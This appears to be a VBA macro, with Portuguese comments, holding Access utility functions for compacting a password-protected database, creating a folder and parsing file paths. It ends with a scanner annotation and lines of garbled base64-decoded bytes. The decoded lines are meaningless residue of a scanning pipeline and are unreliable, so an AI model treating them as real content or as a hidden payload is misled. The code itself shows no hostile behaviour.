' Se a versao DAO for a 3.6 ou superior basta usar a funcao CompactDatabase
'===================================================================

If DBEngine.Version < "3.6" Then DBEngine.RepairDatabase DatabasePath

'se nao informou um arquivo temporario usa "c:\tmp.mdb"
If TempFile = "" Then TempFile = "c:\tmp.mdb"

'apaga o arquivo temp se existir
If Dir(TempFile) <> "" Then Kill TempFile

'formata a senha no formato ";pwd=PASSWORD" se a mesma existir
If Password <> "" Then Password = ";pwd=" & Password

'compacta a base criando um novo banco de dados
DBEngine.CompactDatabase DatabasePath, TempFile, , , Password

'apaga o primeiro banco de dados
Kill DatabasePath

'move a base compactada para a origem
FileCopy TempFile, DatabasePath

'apaga o arquivo temporario
Kill TempFile

End Function

Public Function CriarPasta(sPasta As String) As String
'Cria pasta apartir da origem do sistema

Dim fPasta As New FileSystemObject
Dim MyApl As String

MyApl = Application.CurrentProject.Path

If Not fPasta.FolderExists(MyApl & "\" & sPasta) Then
   fPasta.CreateFolder (MyApl & "\" & sPasta)
End If

CriarPasta = MyApl & "\" & sPasta & "\"

End Function

Public Function getPath(sPathIn As String) As String
'Esta funcao ira retornar apenas o path de uma string que contenha o path e o nome do arquivo:
Dim I As Integer

  For I = Len(sPathIn) To 1 Step -1
     If InStr(":\", Mid$(sPathIn, I, 1)) Then Exit For
  Next

  getPath = Left$(sPathIn, I)

End Function

Public Function getFileName(sFileIn As String) As String
' Essa funcao ira retornar apenas o nome do  arquivo de uma
' string que contenha o path e o nome do arquiva
Dim I As Integer

  For I = Len(sFileIn) To 1 Step -1
     If InStr("\", Mid$(sFileIn, I, 1)) Then Exit For
  Next

  getFileName = Left(Mid$(sFileIn, I + 1, Len(sFileIn) - I), Len(Mid$(sFileIn, I + 1, Len(sFileIn) - I)) - 4)

End Function

Public Function getFileExt(sFileIn As String) As String
' Essa funcao ira retornar apenas o nome do  arquivo de uma
' string que contenha o path e o nome do arquiva
Dim I As Integer

  For I = Len(sFileIn) To 1 Step -1
     If InStr("\", Mid$(sFileIn, I, 1)) Then Exit For
  Next

  getFileExt = Right(Mid$(sFileIn, I + 1, Len(sFileIn) - I), 4)

End Function






' InQuest injected base64 decoded content
' S=AL
' H'$.89
' *G^/CG
' _&6,34
' =AD9TA
' Y< ;5.
' /CXH6
' SL3	
' E.QE
' L17>1?J^V
' ISA0

INQUEST-PP=macro
